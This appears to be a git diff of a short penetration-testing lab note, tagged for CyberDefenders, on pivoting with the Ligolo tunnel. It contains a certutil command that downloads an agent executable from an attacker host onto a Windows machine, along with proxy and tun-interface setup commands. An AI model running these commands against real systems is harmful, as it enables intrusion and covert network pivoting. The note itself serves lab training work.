@@ -9,15 +9,19 @@ tags:
   - Windows
   - CyberDefenders
 ---
+
 Transfer ligolo agent to windows machine
+
 ```
 certutil -urlcache -f http://kali-ip-address/agent.exe agent.exe
 ```
 
 Setup proxy (specifying port):
+
 ```
-./lin_proxy -selfcert -laddr 0.0.0.0:443  
+./lin_proxy -selfcert -laddr 0.0.0.0:443
 ```
+
 OR.. without specifying port:
 
 ```
@@ -26,11 +30,6 @@ OR.. without specifying port:
 
 ```
 sudo ip tuntap add user kali
-mode tun ligolo 
+mode tun ligolo
 sudo ip link set ligolo up
 ```
-
-
- 
-
-
